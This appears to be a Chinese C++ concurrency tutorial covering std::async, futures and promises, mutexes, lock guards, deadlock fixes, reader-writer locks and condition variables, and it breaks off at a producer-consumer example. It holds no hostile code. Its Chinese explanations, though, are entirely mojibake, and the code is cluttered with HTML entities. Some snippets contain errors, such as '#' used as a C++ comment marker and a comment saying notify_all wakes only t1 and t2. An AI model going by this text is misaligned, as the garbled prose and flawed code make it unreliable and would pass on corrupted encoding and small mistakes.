ä¹Ÿå¯ä»¥ç­‰å¾…ä»–æ‰§è¡Œå®Œï¼Œä½†æ˜¯ä¸ä¼šè¿”å›å…¶å€¼ã€‚ åªè¦çº¿ç¨‹æ²¡æœ‰æ‰§è¡Œå®Œï¼Œwait() ä¼šæ— é™ç­‰ä¸‹å»ã€‚è€Œ wait_for() åˆ™å¯ä»¥æŒ‡å®šä¸€ä¸ªæœ€é•¿ç­‰å¾…æ—¶é—´ï¼Œç”¨ chrono è¡¨ç¤ºå•ä½ã€‚ä»–ä¼šè¿”å›ä¸€ä¸ª std::future_status è¡¨ç¤ºç­‰å¾…æ˜¯å¦æˆåŠŸã€‚ å¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´çº¿ç¨‹è¿˜æ²¡æœ‰æ‰§è¡Œå®Œæ¯•ï¼Œåˆ™æ”¾å¼ƒç­‰å¾…ï¼Œè¿”å› future_status::timeoutã€‚ å¦‚æœçº¿ç¨‹åœ¨æŒ‡å®šçš„æ—¶é—´å†…æ‰§è¡Œå®Œæ¯•ï¼Œåˆ™è®¤ä¸ºç­‰å¾…æˆåŠŸï¼Œè¿”å› future_status::readyã€‚ 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;future&gt;int download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl; return 404;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;int main() &#123; std::future&lt;int&gt; fret = std::async([&amp;] &#123; return download(\"hello.zip\"); &#125;); interact(); std::cout &lt;&lt; \"Waiting for download complete...\" &lt;&lt; std::endl; fret.wait(); std::cout &lt;&lt; \"Wait returned!\" &lt;&lt; std::endl; int ret = fret.get(); std::cout &lt;&lt; \"Download result: \" &lt;&lt; ret &lt;&lt; std::endl; return 0;&#125; 1234567891011121314151617181920// wait_forint main() &#123; std::future&lt;int&gt; fret = std::async([&amp;] &#123; return download(\"hello.zip\"); &#125;); interact(); while (true) &#123; std::cout &lt;&lt; \"Waiting for download complete...\" &lt;&lt; std::endl; auto stat = fret.wait_for(std::chrono::milliseconds(1000)); if (stat == std::future_status::ready) &#123; std::cout &lt;&lt; \"Future is ready!!\" &lt;&lt; std::endl; break; &#125; else &#123; std::cout &lt;&lt; \"Future not ready!!\" &lt;&lt; std::endl; &#125; &#125; int ret = fret.get(); std::cout &lt;&lt; \"Download result: \" &lt;&lt; ret &lt;&lt; std::endl; return 0;&#125; std::async çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥è®¾ä¸º std::launch::deferredï¼Œè¿™æ—¶ä¸ä¼šåˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ¥æ‰§è¡Œï¼Œä»–åªä¼šæŠŠ lambda å‡½æ•°ä½“å†…çš„è¿ç®—æ¨è¿Ÿåˆ° future çš„ get() è¢«è°ƒç”¨æ—¶ã€‚ä¹Ÿå°±æ˜¯ main ä¸­çš„ interact è®¡ç®—å®Œæ¯•åã€‚ download çš„æ‰§è¡Œä»åœ¨ä¸»çº¿ç¨‹ä¸­ï¼Œä»–åªæ˜¯å‡½æ•°å¼ç¼–ç¨‹èŒƒå¼æ„ä¹‰ä¸Šçš„å¼‚æ­¥ï¼Œè€Œä¸æ¶‰åŠåˆ°çœŸæ­£çš„å¤šçº¿ç¨‹ã€‚å¯ä»¥ç”¨è¿™ä¸ªå®ç°æƒ°æ€§æ±‚å€¼ï¼ˆlazy evaluationï¼‰ä¹‹ç±»ã€‚ 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;future&gt;int download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl; return 404;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;int main() &#123; std::future&lt;int&gt; fret = std::async(std::launch::deferred, [&amp;] &#123; return download(\"hello.zip\"); &#125;); interact(); int ret = fret.get(); std::cout &lt;&lt; \"Download result: \" &lt;&lt; ret &lt;&lt; std::endl; return 0;&#125; std::promise å¦‚æœä¸æƒ³è®© std::async å¸®ä½ è‡ªåŠ¨åˆ›å»ºçº¿ç¨‹ï¼Œæƒ³è¦æ‰‹åŠ¨åˆ›å»ºçº¿ç¨‹ï¼Œå¯ä»¥ç›´æ¥ç”¨ std::promiseã€‚ ç„¶ååœ¨çº¿ç¨‹è¿”å›çš„æ—¶å€™ï¼Œç”¨ set_value() è®¾ç½®è¿”å›å€¼ã€‚åœ¨ä¸»çº¿ç¨‹é‡Œï¼Œç”¨ get_future() è·å–å…¶ std::future å¯¹è±¡ï¼Œè¿›ä¸€æ­¥ get() å¯ä»¥ç­‰å¾…å¹¶è·å–çº¿ç¨‹è¿”å›å€¼ã€‚ 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;future&gt;int download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl; return 404;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;int main() &#123; std::promise&lt;int&gt; pret; std::thread t1([&amp;] &#123; auto ret = download(\"hello.zip\"); pret.set_value(ret); &#125;); std::future&lt;int&gt; fret = pret.get_future(); interact(); int ret = fret.get(); std::cout &lt;&lt; \"Download result: \" &lt;&lt; ret &lt;&lt; std::endl; t1.join(); return 0;&#125; std::future future ä¸ºäº†ä¸‰äº”æ³•åˆ™ï¼Œåˆ é™¤äº†æ‹·è´æ„é€ /èµ‹å€¼å‡½æ•°ã€‚å¦‚æœéœ€è¦æµ…æ‹·è´ï¼Œå®ç°å…±äº«åŒä¸€ä¸ª future å¯¹è±¡ï¼Œå¯ä»¥ç”¨ std::shared_futureã€‚ å¦‚æœä¸éœ€è¦è¿”å›å€¼ï¼Œstd::async é‡Œ lambda çš„è¿”å›ç±»å‹å¯ä»¥ä¸º voidï¼Œ è¿™æ—¶ future å¯¹è±¡çš„ç±»å‹ä¸º std::futureã€‚ åŒç†æœ‰ std::promiseï¼Œä»–çš„ set_value() ä¸æ¥å—å‚æ•°ï¼Œä»…ä»…ä½œä¸ºåŒæ­¥ç”¨ã€‚ äº’æ–¥é‡ std::mutexï¼šä¸Šé”ï¼Œé˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶è¿›å…¥æŸä¸€ä»£ç æ®µã€‚ è°ƒç”¨ std::mutex çš„ lock() æ—¶ï¼Œä¼šæ£€æµ‹ mutex æ˜¯å¦å·²ç»ä¸Šé”ã€‚å¦‚æœæ²¡æœ‰é”å®šï¼Œåˆ™å¯¹ mutex è¿›è¡Œä¸Šé”ã€‚å¦‚æœå·²ç»é”å®šï¼Œåˆ™é™·å…¥ç­‰å¾…ï¼Œç›´åˆ° mutex è¢«å¦ä¸€ä¸ªçº¿ç¨‹è§£é”åï¼Œæ‰å†æ¬¡ä¸Šé”ã€‚ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;int main() &#123; std::vector&lt;int&gt; arr; std::mutex mtx; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx.lock(); arr.push_back(1); mtx.unlock(); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx.lock(); arr.push_back(2); mtx.unlock(); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; std::lock_guard æ ¹æ® RAII æ€æƒ³ï¼Œå¯å°†é”çš„æŒæœ‰è§†ä¸ºèµ„æºï¼Œä¸Šé”è§†ä¸ºé”çš„è·å–ï¼Œè§£é”è§†ä¸ºé”çš„é‡Šæ”¾ã€‚ std::lock_guard å°±æ˜¯è¿™æ ·ä¸€ä¸ªå·¥å…·ç±»ï¼Œä»–çš„æ„é€ å‡½æ•°é‡Œä¼šè°ƒç”¨ mtx.lock()ï¼Œè§£æ„å‡½æ•°ä¼šè°ƒç”¨ mtx.unlock()ã€‚ 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;int main() &#123; std::vector&lt;int&gt; arr; std::mutex mtx; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::lock_guard grd(mtx); arr.push_back(1); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::lock_guard grd(mtx); arr.push_back(2); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; std::unique_lock std::lock_guard ä¸¥æ ¼åœ¨è§£æ„æ—¶ unlock()ï¼Œä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬ä¼šå¸Œæœ›æå‰ unlock()ã€‚è¿™æ—¶å¯ä»¥ç”¨ std::unique_lockï¼Œä»–é¢å¤–å­˜å‚¨äº†ä¸€ä¸ª flag è¡¨ç¤ºæ˜¯å¦å·²ç»è¢«é‡Šæ”¾ã€‚å¯ä»¥ç›´æ¥è°ƒç”¨ unique_lock çš„ unlock() å‡½æ•°æ¥æå‰è§£é”ã€‚ä»–ä¼šåœ¨è§£æ„æ£€æµ‹ flagï¼Œå¦‚æœæ²¡æœ‰é‡Šæ”¾ï¼Œåˆ™è°ƒç”¨ unlock()ï¼Œå¦åˆ™ä¸è°ƒç”¨ã€‚ 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;int main() &#123; std::vector&lt;int&gt; arr; std::mutex mtx; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::unique_lock grd(mtx); arr.push_back(1); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::unique_lock grd(mtx); arr.push_back(2); grd.unlock(); printf(\"outside of lock\\n\"); // grd.lock(); // å¦‚æœéœ€è¦ï¼Œè¿˜å¯ä»¥é‡æ–°ä¸Šé” &#125; &#125;); t1.join(); t2.join(); return 0;&#125; std::unique_lock çš„æ„é€ å‡½æ•°è¿˜å¯ä»¥æœ‰ä¸€ä¸ªé¢å¤–å‚æ•°ï¼Œé‚£å°±æ˜¯ std::defer_lockã€‚æŒ‡å®šäº†è¿™ä¸ªå‚æ•°çš„è¯ï¼Œstd::unique_lock ä¸ä¼šåœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨ mtx.lock()ï¼Œéœ€è¦ä¹‹åå†æ‰‹åŠ¨è°ƒç”¨ grd.lock() æ‰èƒ½ä¸Šé”ã€‚ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;int main() &#123; std::vector&lt;int&gt; arr; std::mutex mtx; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::unique_lock grd(mtx); arr.push_back(1); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::unique_lock grd(mtx, std::defer_lock); printf(\"before the lock\\n\"); grd.lock(); arr.push_back(2); grd.unlock(); printf(\"outside of lock\\n\"); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; ä¸åŒçš„å¯¹è±¡ï¼Œå„æœ‰ä¸€ä¸ª mutexï¼Œç‹¬ç«‹åœ°ä¸Šé”ï¼Œå¯ä»¥é¿å…ä¸å¿…è¦çš„é”å®šï¼Œæå‡é«˜å¹¶å‘æ—¶çš„æ€§èƒ½ã€‚ ä¹Ÿå¯ä»¥ç”¨æ— é˜»å¡çš„ try_lock()ï¼Œä»–åœ¨ä¸Šé”å¤±è´¥æ—¶ä¸ä¼šé™·å…¥ç­‰å¾…ï¼Œè€Œæ˜¯ç›´æ¥è¿”å› falseï¼›å¦‚æœä¸Šé”æˆåŠŸï¼Œåˆ™ä¼šè¿”å› trueã€‚ 12345678910111213141516171819#include &lt;cstdio&gt;#include &lt;mutex&gt;std::mutex mtx1;int main() &#123; if (mtx1.try_lock()) printf(\"succeed\\n\"); else printf(\"failed\\n\"); if (mtx1.try_lock()) printf(\"succeed\\n\"); else printf(\"failed\\n\"); mtx1.unlock(); return 0;&#125; std::unique_lock å’Œ std::mutex å…·æœ‰åŒæ ·çš„æ¥å£ã€‚ è¿™ç§åªè¦å…·æœ‰æŸäº›æŒ‡å®šåå­—çš„æˆå‘˜å‡½æ•°ï¼Œå°±åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦æ»¡è¶³æŸäº›åŠŸèƒ½çš„æ€æƒ³ï¼Œåœ¨ Python ç§°ä¸ºé¸­å­ç±»å‹ï¼Œè€Œ C++ ç§°ä¸º conceptï¼ˆæ¦‚å¿µï¼‰ã€‚æ¯”èµ·è™šå‡½æ•°å’ŒåŠ¨æ€å¤šæ€çš„æ¥å£æŠ½è±¡ï¼Œconcept ä½¿å®ç°å’Œæ¥å£æ›´åŠ è§£è€¦åˆä¸”æ²¡æœ‰æ€§èƒ½æŸå¤±ã€‚ æ­»é” åŒæ–¹éƒ½åœ¨ç­‰ç€å¯¹æ–¹é‡Šæ”¾é”ï¼Œä½†æ˜¯å› ä¸ºç­‰å¾…è€Œæ— æ³•é‡Šæ”¾é”ï¼Œä»è€Œè¦æ— é™åˆ¶ç­‰ä¸‹å»ã€‚ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;mutex&gt;int main() &#123; std::mutex mtx1; std::mutex mtx2; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx1.lock(); mtx2.lock(); mtx2.unlock(); mtx1.unlock(); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx2.lock(); mtx1.lock(); mtx1.unlock(); mtx2.unlock(); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; è§£å†³1ï¼šæ°¸è¿œä¸è¦åŒæ—¶æŒæœ‰ä¸¤ä¸ªé” 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;mutex&gt;int main() &#123; std::mutex mtx1; std::mutex mtx2; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx1.lock(); mtx1.unlock(); mtx2.lock(); mtx2.unlock(); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx2.lock(); mtx2.unlock(); mtx1.lock(); mtx1.unlock(); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; è§£å†³2ï¼šä¿è¯åŒæ–¹ä¸Šé”é¡ºåºä¸€è‡´ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;mutex&gt;int main() &#123; std::mutex mtx1; std::mutex mtx2; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx1.lock(); mtx2.lock(); mtx2.unlock(); mtx1.unlock(); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx1.lock(); mtx2.lock(); mtx2.unlock(); mtx1.unlock(); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; è§£å†³3ï¼šç”¨ std::lock åŒæ—¶å¯¹å¤šä¸ªä¸Šé” å¯ä»¥ç”¨æ ‡å‡†åº“çš„ std::lock(mtx1, mtx2, ...) å‡½æ•°ï¼Œä¸€æ¬¡æ€§å¯¹å¤šä¸ª mutex ä¸Šé”ã€‚ä»–æ¥å—ä»»æ„å¤šä¸ª mutex ä½œä¸ºå‚æ•°ï¼Œå¹¶ä¸”ä»–ä¿è¯åœ¨æ— è®ºä»»æ„çº¿ç¨‹ä¸­è°ƒç”¨çš„é¡ºåºæ˜¯å¦ç›¸åŒï¼Œéƒ½ä¸ä¼šäº§ç”Ÿæ­»é”é—®é¢˜ã€‚ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;mutex&gt;int main() &#123; std::mutex mtx1; std::mutex mtx2; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::lock(mtx1, mtx2); mtx1.unlock(); mtx2.unlock(); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::lock(mtx2, mtx1); mtx2.unlock(); mtx1.unlock(); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; 123456789101112131415161718192021222324252627// RAII#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;mutex&gt;int main() &#123; std::mutex mtx1; std::mutex mtx2; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::scoped_lock grd(mtx1, mtx2); // do something &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::scoped_lock grd(mtx2, mtx1); // do something &#125; &#125;); t1.join(); t2.join(); return 0;&#125; åŒä¸€ä¸ªçº¿ç¨‹é‡å¤è°ƒç”¨ lock() ä¹Ÿä¼šé€ æˆæ­»é”ã€‚å³ä½¿åªæœ‰ä¸€ä¸ªçº¿ç¨‹ä¸€ä¸ªé”ï¼Œå¦‚æœ lock() ä»¥ååˆè°ƒç”¨ lock()ï¼Œä¹Ÿä¼šé€ æˆæ­»é”ã€‚ 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;mutex&gt;std::mutex mtx1;void other() &#123; mtx1.lock(); // do something mtx1.unlock();&#125;void func() &#123; mtx1.lock(); other(); mtx1.unlock();&#125;int main() &#123; func(); return 0;&#125; è§£å†³1ï¼šother é‡Œä¸è¦å†ä¸Šé” 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;mutex&gt;std::mutex mtx1;/// NOTE: please lock mtx1 before calling other()void other() &#123; // do something&#125;void func() &#123; mtx1.lock(); other(); mtx1.unlock();&#125;int main() &#123; func(); return 0;&#125; è§£å†³2ï¼šæ”¹ç”¨ std::recursive_mutex ä»–ä¼šè‡ªåŠ¨åˆ¤æ–­æ˜¯ä¸æ˜¯åŒä¸€ä¸ªçº¿ç¨‹ lock() äº†å¤šæ¬¡åŒä¸€ä¸ªé”ï¼Œå¦‚æœæ˜¯åˆ™è®©è®¡æ•°å™¨åŠ 1ï¼Œä¹‹å unlock() ä¼šè®©è®¡æ•°å™¨å‡1ï¼Œå‡åˆ°0æ—¶æ‰çœŸæ­£è§£é”ã€‚ä½†æ˜¯ç›¸æ¯”æ™®é€šçš„ std::mutex æœ‰ä¸€å®šæ€§èƒ½æŸå¤±ã€‚ 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;mutex&gt;std::recursive_mutex mtx1;void other() &#123; mtx1.lock(); // do something mtx1.unlock();&#125;void func() &#123; mtx1.lock(); other(); mtx1.unlock();&#125;int main() &#123; func(); return 0;&#125; çº¿ç¨‹å®‰å…¨çš„vectorå°è£… vector ä¸æ˜¯å¤šçº¿ç¨‹å®‰å…¨çš„å®¹å™¨ã€‚å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€ä¸ª vector ä¼šå‡ºç°æ•°æ®ç«äº‰ï¼ˆdata-raceï¼‰ç°è±¡ã€‚ å…ˆçœ‹çœ‹é”™è¯¯çš„æ–¹å¼ï¼šç”¨ä¸€ä¸ªç±»å°è£…ä¸€ä¸‹å¯¹ vector çš„è®¿é—®ï¼Œä½¿å…¶è®¿é—®éƒ½å—åˆ°ä¸€ä¸ª mutex çš„ä¿æŠ¤ã€‚ä¼šå‡ºé”™äº†ï¼å› ä¸º size() æ˜¯ const å‡½æ•°ï¼Œè€Œ mutex::lock() å´ä¸æ˜¯ const çš„ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;class MTVector &#123; std::vector&lt;int&gt; m_arr; std::mutex m_mtx;public: void push_back(int val) &#123; m_mtx.lock(); m_arr.push_back(val); m_mtx.unlock(); &#125; # Errorï¼š mutex::lock() å´ä¸æ˜¯ const çš„ size_t size() const &#123; m_mtx.lock(); size_t ret = m_arr.size(); m_mtx.unlock(); return ret; &#125;&#125;;int main() &#123; MTVector arr; std::thread t1([&amp;] () &#123; for (int i = 0; i &lt; 1000; i++) &#123; arr.push_back(i); &#125; &#125;); std::thread t2([&amp;] () &#123; for (int i = 0; i &lt; 1000; i++) &#123; arr.push_back(1000 + i); &#125; &#125;); t1.join(); t2.join(); std::cout &lt;&lt; arr.size() &lt;&lt; std::endl; return 0;&#125; è§£å†³æ–¹æ³•ï¼šmutableï¼Œè®© this ä¸º const æ—¶ä»…ä»…ç»™ m_mtx å¼€åé—¨ï¼Œå¯ä»¥ç”¨ mutable å…³é”®å­—ä¿®é¥°ä»–ï¼Œä»è€Œæ‰€æœ‰æˆå‘˜é‡Œåªæœ‰ä»–ä¸æ˜¯ const çš„ã€‚ 123456789101112131415161718class MTVector &#123; std::vector&lt;int&gt; m_arr; mutable std::mutex m_mtx;public: void push_back(int val) &#123; m_mtx.lock(); m_arr.push_back(val); m_mtx.unlock(); &#125; size_t size() const &#123; m_mtx.lock(); size_t ret = m_arr.size(); m_mtx.unlock(); return ret; &#125;&#125;; è¯»å†™é” è¯»å¯ä»¥å…±äº«ï¼Œå†™å¿…é¡»ç‹¬å ï¼Œä¸”å†™å’Œè¯»ä¸èƒ½å…±å­˜ã€‚ æ ‡å‡†åº“æä¾›äº† std::shared_mutexã€‚ä¸Šé”æ—¶ï¼Œè¦æŒ‡å®šä½ çš„éœ€æ±‚æ˜¯è¯»è¿˜æ˜¯å†™ï¼Œè´Ÿè´£è°ƒåº¦çš„è¯»å†™é”ä¼šå¸®ä½ åˆ¤æ–­è¦ä¸è¦ç­‰å¾…ã€‚ push_back() éœ€è¦ä¿®æ”¹æ•°æ®ï¼Œå› éœ€æ±‚æ­¤ä¸ºæ‹‰ï¼Œä½¿ç”¨ lock() å’Œ unlock() çš„ç»„åˆã€‚ size() åˆ™åªè¦è¯»å–æ•°æ®ï¼Œä¸ä¿®æ”¹æ•°æ®ï¼Œå› æ­¤å¯ä»¥å’Œåˆ«äººå…±äº«ä¸€èµ·å–ï¼Œä½¿ç”¨ lock_shared() å’Œ unlock_shared() çš„ç»„åˆã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;shared_mutex&gt;class MTVector &#123; std::vector&lt;int&gt; m_arr; mutable std::shared_mutex m_mtx;public: void push_back(int val) &#123; m_mtx.lock(); m_arr.push_back(val); m_mtx.unlock(); &#125; size_t size() const &#123; m_mtx.lock_shared(); size_t ret = m_arr.size(); m_mtx.unlock_shared(); return ret; &#125;&#125;;int main() &#123; MTVector arr; std::thread t1([&amp;] () &#123; for (int i = 0; i &lt; 1000; i++) &#123; arr.push_back(i); &#125; &#125;); std::thread t2([&amp;] () &#123; for (int i = 0; i &lt; 1000; i++) &#123; arr.push_back(1000 + i); &#125; &#125;); t1.join(); t2.join(); std::cout &lt;&lt; arr.size() &lt;&lt; std::endl; return 0;&#125; æˆ–è€…ï¼š 123456789101112131415class MTVector &#123; std::vector&lt;int&gt; m_arr; mutable std::shared_mutex m_mtx;public: void push_back(int val) &#123; std::unique_lock grd(m_mtx); m_arr.push_back(val); &#125; size_t size() const &#123; std::shared_lock grd(m_mtx); return m_arr.size(); &#125;&#125;; åªéœ€ä¸€æ¬¡ä¸Šé”çš„è®¿é—®è€…æ¨¡å¼ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;class MTVector &#123; std::vector&lt;int&gt; m_arr; std::mutex m_mtx;public: class Accessor &#123; MTVector &amp;m_that; std::unique_lock&lt;std::mutex&gt; m_guard; public: Accessor(MTVector &amp;that) : m_that(that), m_guard(that.m_mtx) &#123;&#125; void push_back(int val) const &#123; return m_that.m_arr.push_back(val); &#125; size_t size() const &#123; return m_that.m_arr.size(); &#125; &#125;; Accessor access() &#123; return &#123;*this&#125;; &#125;&#125;;int main() &#123; MTVector arr; std::thread t1([&amp;] () &#123; auto axr = arr.access(); # Accessor æ„é€ å‡½æ•°ä¸Šé” for (int i = 0; i &lt; 1000; i++) &#123; axr.push_back(i); &#125; &#125;); std::thread t2([&amp;] () &#123; auto axr = arr.access(); for (int i = 0; i &lt; 1000; i++) &#123; axr.push_back(1000 + i); &#125; &#125;); t1.join(); t2.join(); std::cout &lt;&lt; arr.access().size() &lt;&lt; std::endl; return 0;&#125; æ¡ä»¶å˜é‡ æ¡ä»¶å˜é‡cv.wait(lck) å°†ä¼šè®©å½“å‰çº¿ç¨‹é™·å…¥ç­‰å¾…ã€‚åœ¨å…¶ä»–çº¿ç¨‹ä¸­è°ƒç”¨ cv.notify_one() åˆ™ä¼šå”¤é†’é‚£ä¸ªé™·å…¥ç­‰å¾…çš„çº¿ç¨‹ã€‚ cv.notify_one() åªä¼šå”¤é†’å…¶ä¸­ä¸€ä¸ªç­‰å¾…ä¸­çš„çº¿ç¨‹ï¼Œè€Œ cv.notify_all() ä¼šå”¤é†’å…¨éƒ¨ã€‚ è¿˜å¯ä»¥é¢å¤–æŒ‡å®šä¸€ä¸ªå‚æ•°ï¼Œå˜æˆ cv.wait(lck, expr) çš„å½¢å¼ï¼Œå…¶ä¸­ expr æ˜¯ä¸ª lambda è¡¨è¾¾å¼ï¼Œåªæœ‰å…¶è¿”å›å€¼ä¸º true æ—¶æ‰ä¼šçœŸæ­£å”¤é†’ï¼Œå¦åˆ™ç»§ç»­ç­‰å¾…ã€‚wait() çš„è¿‡ç¨‹ä¸­ä¼šæš‚æ—¶ unlock() è¿™ä¸ªé”ã€‚ 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;mutex&gt;#include &lt;condition_variable&gt;int main() &#123; std::condition_variable cv; std::mutex mtx; bool ready = false; std::thread t1([&amp;] &#123; std::unique_lock lck(mtx); cv.wait(lck, [&amp;] &#123; return ready; &#125;); std::cout &lt;&lt; \"t1 is awake\" &lt;&lt; std::endl; &#125;); std::cout &lt;&lt; \"notifying not ready\" &lt;&lt; std::endl; cv.notify_one(); // useless now, since ready = false ready = true; std::cout &lt;&lt; \"notifying ready\" &lt;&lt; std::endl; cv.notify_one(); // awakening t1, since ready = true t1.join(); return 0;&#125; std::condition_variable å¿…é¡»å’Œ std::unique_lock&lt;std::mutex&gt; ä¸€èµ·ç”¨ã€‚å› ä¸ºè¦ä¿è¯å¤šä¸ªçº¿ç¨‹è¢«å”¤é†’æ—¶ ( cv.notify_all() )ï¼Œåªæœ‰ä¸€ä¸ªèƒ½å¤Ÿè¢«å¯åŠ¨ã€‚ std::condition_variable ä»…ä»…æ”¯æŒ std::unique_lock&lt;std::mutex&gt; ä½œä¸º wait çš„å‚æ•°ï¼Œå¦‚æœéœ€è¦ç”¨å…¶ä»–ç±»å‹çš„ mutex é”ï¼Œå¯ä»¥ç”¨ std::condition_variable_anyã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;#include &lt;condition_variable&gt;int main() &#123; std::condition_variable cv; std::mutex mtx; std::thread t1([&amp;] &#123; std::unique_lock lck(mtx); cv.wait(lck); std::cout &lt;&lt; \"t1 is awake\" &lt;&lt; std::endl; &#125;); std::thread t2([&amp;] &#123; std::unique_lock lck(mtx); cv.wait(lck); std::cout &lt;&lt; \"t2 is awake\" &lt;&lt; std::endl; &#125;); std::thread t3([&amp;] &#123; std::unique_lock lck(mtx); cv.wait(lck); std::cout &lt;&lt; \"t3 is awake\" &lt;&lt; std::endl; &#125;); std::this_thread::sleep_for(std::chrono::milliseconds(400)); std::cout &lt;&lt; \"notifying one\" &lt;&lt; std::endl; cv.notify_one(); // awakening t1 only std::this_thread::sleep_for(std::chrono::milliseconds(400)); std::cout &lt;&lt; \"notifying all\" &lt;&lt; std::endl; cv.notify_all(); // awakening t1 and t2 t1.join(); t2.join(); t3.join(); return 0;&#125; å®ç°ç”Ÿæˆè€…æ¶ˆè´¹è€… 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;#include 